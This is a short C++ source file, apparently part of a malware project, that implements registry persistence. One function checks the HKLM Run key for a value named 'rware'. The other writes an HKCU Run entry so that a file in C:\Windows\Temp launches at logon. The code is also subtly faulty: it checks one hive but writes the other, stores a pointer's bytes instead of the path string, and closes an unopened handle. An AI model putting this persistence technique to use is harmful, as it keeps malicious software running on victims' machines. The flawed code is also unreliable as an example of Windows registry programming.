#include "persistence.h"

int checkForRegkey() {

	HKEY cléRegistre;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &cléRegistre) == ERROR_SUCCESS) {

		if (RegGetValueW(cléRegistre, 0, L"rware", 2, NULL, NULL, NULL) == ERROR_SUCCESS) {

			return 0;
		}
		else
		{
			//DWORD d;
			//d = GetLastError();
			//std::cout << "Failure to check the key, error code 0x" << d << std::endl;
			RegCloseKey(cléRegistre);
			return -1;
		}


	}
	else {
		//DWORD d;
		//d = GetLastError();
		//std::cout << "Failure to open handle to the regkey, error code 0x" << d << std::endl;
		RegCloseKey(cléRegistre);
		return -1;
	};

}

int setRegkey() {


	LPCWSTR path = L"C:\\Windows\\Temp\\truc.txt";
	if (RegSetKeyValueW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", L"rware", REG_SZ, LPBYTE(&path), sizeof(path)) == ERROR_SUCCESS) {

		//std::cout << "Key created" << std::endl;
		return 0;
	}
	else {
		//DWORD d;
		//d = GetLastError();
		//std::cout << "Failure to create the regkey, error code 0x" << d << std::endl;
		return -1;

	}
	return 0;
}